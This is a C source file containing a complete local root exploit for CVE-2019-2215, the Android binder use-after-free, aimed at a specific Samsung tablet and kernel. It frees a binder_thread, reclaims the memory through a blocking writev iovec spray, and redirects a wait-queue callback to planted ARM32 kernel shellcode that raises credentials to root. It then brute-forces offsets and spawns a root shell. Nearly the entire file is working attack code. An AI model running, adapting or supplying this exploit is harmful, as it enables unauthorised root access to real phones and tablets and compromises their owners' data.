/*
 * cve_2019_2215_v2.c — Correct CVE-2019-2215 exploit using iovec spray
 *
 * The iovec spray technique:
 * - writev(pipe_fd, iov, N) where pipe is full → blocks
 * - Kernel kmalloc's the iov array for duration of the block
 * - We control iov content (it's our userspace array copied to kernel)
 * - Size: N * 8 bytes on ARM32
 * - For kmalloc-512: N = 64 iovecs
 *
 * Exploit flow:
 * 1. Thread 1: open binder, mmap, epoll_ctl(ADD) → creates binder_thread
 * 2. Thread 1: BINDER_THREAD_EXIT → frees binder_thread (UAF!)
 * 3. Thread 2: blocking writev with crafted iov → reclaims freed slot
 * 4. Thread 1: epoll_ctl(DEL) → accesses freed memory → our data → func ptr
 */
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <pthread.h>

#define BINDER_WRITE_READ    _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT   _IOW('b', 8, int32_t)
#define BINDER_VERSION       _IOWR('b', 9, struct binder_version)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};
struct binder_version { signed long protocol_version; };
#define BC_ENTER_LOOPER 0x630c
#define BINDER_MMAP_SIZE (128 * 1024)

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

/* ARM32 shellcode: commit_creds(prepare_kernel_cred(0))
 * Then return 0 (from the fake wait_queue callback) */
__attribute__((naked)) void kernel_shellcode(void) {
    __asm__ volatile(
        "stmfd sp!, {r4, lr}\n"
        "mov r0, #0\n"
        "ldr r4, =0xc00548e0\n"   /* prepare_kernel_cred */
        "blx r4\n"
        "ldr r4, =0xc0054328\n"   /* commit_creds */
        "blx r4\n"
        "mov r0, #0\n"
        "ldmfd sp!, {r4, pc}\n"
    );
}

struct spray_args {
    int pipe_wr;          /* write end of pipe (will block) */
    struct iovec *iov;    /* crafted iov array */
    int iovcnt;
    volatile int started; /* signal that writev has been called */
    volatile int done;
};

static void *spray_thread(void *arg) {
    struct spray_args *a = (struct spray_args*)arg;
    a->started = 1;
    /* This writev will BLOCK because pipe is full.
     * The iov array is kmalloc'd in kernel for the duration. */
    ssize_t r = writev(a->pipe_wr, a->iov, a->iovcnt);
    a->done = 1;
    return (void*)(long)r;
}

static int try_exploit_iovec(int wait_offset, int is_k256) {
    int slab_size = is_k256 ? 256 : 512;
    int iovcnt = slab_size / 8; /* sizeof(struct iovec) = 8 on ARM32 */

    printf("\n[*] Trying: wait_offset=%d slab=kmalloc-%d iovcnt=%d\n",
           wait_offset, slab_size, iovcnt);

    /* Map shellcode at fixed address */
    void *sc = mmap((void*)0x42000000, 4096,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (sc == MAP_FAILED) { perror("sc mmap"); return -1; }

    /* Copy shellcode function to the mapped page */
    memcpy(sc, (void*)kernel_shellcode, 256);

    /* Set up fake wait_queue_entry at a known location */
    uint8_t *fake_entry = (uint8_t*)sc + 0x200;
    /* wait_queue_entry: flags(4), private(4), func(4), task_list(8) */
    *(uint32_t*)(fake_entry + 0) = 0;              /* flags */
    *(uint32_t*)(fake_entry + 4) = 0;              /* private (task_struct) */
    *(uint32_t*)(fake_entry + 8) = (uint32_t)sc;   /* func → shellcode */
    /* task_list: point to self to prevent list walking */

    /* Build iovec array */
    struct iovec *iov = calloc(iovcnt, sizeof(struct iovec));
    if (!iov) { perror("calloc"); return -1; }

    /* Fill iov with benign data first */
    char dummy_buf[4096];
    memset(dummy_buf, 0, sizeof(dummy_buf));
    for (int i = 0; i < iovcnt; i++) {
        iov[i].iov_base = dummy_buf;
        iov[i].iov_len = 0;
    }

    /* Now craft the entries at the wait_queue_head offset.
     * wait_queue_head_t at offset wait_offset in the kmalloc'd iov array:
     *   +0: spinlock_t (4 bytes) = 0 (unlocked)
     *   +4: task_list.next (4 bytes) = pointer to fake_entry
     *   +8: task_list.prev (4 bytes) = pointer to fake_entry
     *
     * In the iov array:
     *   iov[i].iov_base is at offset i*8+0
     *   iov[i].iov_len  is at offset i*8+4
     *
     * wait_offset maps to:
     *   byte at wait_offset → in iov[wait_offset/8] at internal offset wait_offset%8
     */
    int iov_idx = wait_offset / 8;
    int byte_off = wait_offset % 8;

    if (byte_off == 0) {
        /* lock at iov[idx].base, next at iov[idx].len, prev at iov[idx+1].base */
        iov[iov_idx].iov_base = (void*)0;                    /* lock = 0 */
        iov[iov_idx].iov_len = (size_t)fake_entry;           /* next → fake */
        if (iov_idx + 1 < iovcnt)
            iov[iov_idx + 1].iov_base = (void*)fake_entry;   /* prev → fake */
    } else if (byte_off == 4) {
        /* lock at iov[idx].len, next at iov[idx+1].base, prev at iov[idx+1].len */
        iov[iov_idx].iov_len = 0;                            /* lock = 0 */
        if (iov_idx + 1 < iovcnt) {
            iov[iov_idx + 1].iov_base = (void*)fake_entry;   /* next → fake */
            iov[iov_idx + 1].iov_len = (size_t)fake_entry;   /* prev → fake */
        }
    }

    /* Make the fake_entry's task_list point back to the wait_queue_head
     * to properly terminate the list. The head's next/prev location in
     * kernel memory is unknown, but the fake entry can point to itself. */
    *(uint32_t*)(fake_entry + 12) = (uint32_t)(fake_entry + 12); /* next = self */
    *(uint32_t*)(fake_entry + 16) = (uint32_t)(fake_entry + 12); /* prev = self */

    /* Create the blocking pipe for writev */
    int pfd[2];
    if (pipe(pfd) < 0) { perror("pipe"); free(iov); return -1; }

    /* Fill the pipe to make writev block */
    fcntl(pfd[1], F_SETFL, O_NONBLOCK);
    char fill[4096];
    memset(fill, 'X', sizeof(fill));
    while (write(pfd[1], fill, sizeof(fill)) > 0);
    fcntl(pfd[1], F_SETFL, 0); /* back to blocking */

    /* Set iov[0] to write at least 1 byte so writev doesn't return immediately */
    iov[0].iov_base = fill;
    iov[0].iov_len = 1;

    /* Open binder */
    int binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { free(iov); close(pfd[0]); close(pfd[1]); return -1; }

    void *bmap = mmap(NULL, BINDER_MMAP_SIZE, PROT_READ,
                      MAP_PRIVATE, binder_fd, 0);

    uint32_t max_threads = 0;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);

    /* Add to epoll → creates binder_thread */
    int epfd = epoll_create1(0);
    struct epoll_event ev = { .events = EPOLLIN };
    epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &ev);

    /* FREE the binder_thread! */
    ioctl(binder_fd, BINDER_THREAD_EXIT, &(int32_t){0});
    printf("  Thread freed.\n");

    /* Launch spray thread — writev will block and keep iov allocated */
    struct spray_args args = { .pipe_wr = pfd[1], .iov = iov,
                               .iovcnt = iovcnt, .started = 0, .done = 0 };

    /* Do multiple spray attempts to increase chance of reclaim */
    pthread_t spray_tids[30];
    struct spray_args spray_args_arr[30];
    int spray_count = 0;

    for (int i = 0; i < 30; i++) {
        int spfd[2];
        if (pipe(spfd) < 0) break;
        fcntl(spfd[1], F_SETFL, O_NONBLOCK);
        while (write(spfd[1], fill, sizeof(fill)) > 0);
        fcntl(spfd[1], F_SETFL, 0);

        /* Build a fresh iov with same payload */
        struct iovec *siov = calloc(iovcnt, sizeof(struct iovec));
        memcpy(siov, iov, iovcnt * sizeof(struct iovec));
        siov[0].iov_base = fill;
        siov[0].iov_len = 1;

        spray_args_arr[i].pipe_wr = spfd[1];
        spray_args_arr[i].iov = siov;
        spray_args_arr[i].iovcnt = iovcnt;
        spray_args_arr[i].started = 0;
        spray_args_arr[i].done = 0;

        pthread_create(&spray_tids[i], NULL, spray_thread, &spray_args_arr[i]);
        spray_count++;
        /* Wait for it to start blocking */
        while (!spray_args_arr[i].started) usleep(100);
        usleep(1000);
    }
    printf("  %d spray threads blocking (iov allocated in kernel)\n", spray_count);

    /* Now trigger the UAF */
    uid_t before = getuid();
    printf("  UID before trigger: %d\n", before);
    printf("  Triggering via epoll_ctl DEL...\n");
    fflush(stdout);

    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &ev);

    uid_t after = getuid();
    printf("  UID after trigger: %d\n", after);

    if (after == 0) {
        printf("\n  *** ROOT! ***\n");
        free(iov);
        close(binder_fd);
        close(epfd);
        system("id");
        system("/system/bin/sh");
        return 0;
    }

    /* Cleanup: drain pipes to unblock spray threads */
    for (int i = 0; i < spray_count; i++) {
        char drain[4096];
        /* Read from the read end of each spray pipe to unblock writev */
        /* We don't have the read ends easily... just cancel the threads */
        pthread_cancel(spray_tids[i]);
    }
    usleep(100000);

    close(binder_fd);
    close(epfd);
    close(pfd[0]);
    close(pfd[1]);
    munmap(sc, 4096);
    free(iov);

    return -1;
}

int main(void) {
    printf("=== CVE-2019-2215 Exploit v2 (iovec spray) ===\n");
    printf("Target: SM-T377A, kernel 3.10.9, patch 2017-07\n");
    printf("UID: %d\n\n", getuid());

    /* Try combinations of offset and slab size */
    /* binder_thread likely in kmalloc-256 or kmalloc-512 */
    int offsets[] = { 36, 40, 44, 48, 52, 56, 60, 64, 68, 72, 76, 80,
                      84, 88, 92, 96, 100, 104, 108, 112 };
    int num_offsets = sizeof(offsets) / sizeof(offsets[0]);

    for (int is_k256 = 0; is_k256 <= 1; is_k256++) {
        printf("\n=== Trying kmalloc-%d ===\n", is_k256 ? 256 : 512);

        for (int i = 0; i < num_offsets; i++) {
            pid_t pid = fork();
            if (pid == 0) {
                alarm(8);
                int r = try_exploit_iovec(offsets[i], is_k256);
                _exit(r == 0 ? 42 : 0);
            }
            int status;
            waitpid(pid, &status, 0);

            if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
                printf("\n[!!!] ROOT at offset=%d slab=%d!\n",
                       offsets[i], is_k256 ? 256 : 512);
                try_exploit_iovec(offsets[i], is_k256);
                return 0;
            } else if (WIFSIGNALED(status)) {
                printf("  offset %d: CRASHED (signal %d) — UAF CONFIRMED!\n",
                       offsets[i], WTERMSIG(status));
            }
        }
    }

    /* Check dmesg */
    printf("\n--- dmesg errors ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -i -E 'oops|bug|panic|fault|binder|Backtrace|PC.is|Unable|BUG' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
